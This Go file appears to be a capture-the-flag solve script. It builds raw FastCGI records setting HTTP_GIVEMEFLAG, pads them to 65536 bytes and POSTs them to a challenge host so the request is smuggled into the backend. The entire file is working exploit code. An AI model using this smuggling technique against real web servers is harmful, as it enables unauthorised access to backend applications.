package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

const (
	FCGI_BEGIN_REQUEST = 1
	FCGI_ABORT_REQUEST = 2
	FCGI_END_REQUEST   = 3
	FCGI_PARAMS        = 4
	FCGI_STDIN         = 5
	FCGI_STDOUT        = 6
	FCGI_STDERR        = 7
	FCGI_DATA          = 8

	FCGI_RESPONDER = 1
	FCGI_VERSION_1 = 1
)

type header struct {
	Version       uint8
	Type          uint8
	RequestID     uint16
	ContentLength uint16
	PaddingLength uint8
	Reserved      uint8
}

func main() {
	var buf bytes.Buffer

	buf.Write([]byte("a"))

	// Create PARAMS header
	h := header{
		Version:       1,
		Type:          FCGI_PARAMS,
		RequestID:     1,
		ContentLength: 0, // We'll set this after calculating content length
		PaddingLength: 0,
	}

	// Construct PARAMS content
	key := "HTTP_GIVEMEFLAG"
	value := "true"
	content := append([]byte{}, encodeLength(uint32(len(key)))...)
	content = append(content, encodeLength(uint32(len(value)))...)
	content = append(content, key...)
	content = append(content, value...)

	// Update header with content length
	h.ContentLength = uint16(len(content))

	// Write header to buffer
	binary.Write(&buf, binary.BigEndian, h)

	// Write content to buffer
	buf.Write(content)

	h = header{
		Version:       FCGI_VERSION_1,
		Type:          FCGI_STDIN,
		RequestID:     1,
		ContentLength: 0,
		PaddingLength: 0,
	}
	binary.Write(&buf, binary.BigEndian, h)

	remainingLength := 65536 - len(string(buf.Bytes()))

	for i := 0; i <= remainingLength; i++ {
		buf.Write([]byte("a"))
	}

	fmt.Println(len(buf.Bytes()))

	// Create HTTP client
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Create request with our payload
	req, err := http.NewRequest("POST", "http://"+os.Getenv("SECCON_HOST"), &buf)
	if err != nil {
		log.Fatal(err)
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	// Read and print response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(body))
}

func encodeLength(length uint32) []byte {
	if length < 128 {
		return []byte{byte(length)}
	}
	return []byte{
		byte((length >> 24) | 0x80),
		byte(length >> 16),
		byte(length >> 8),
		byte(length),
	}
}
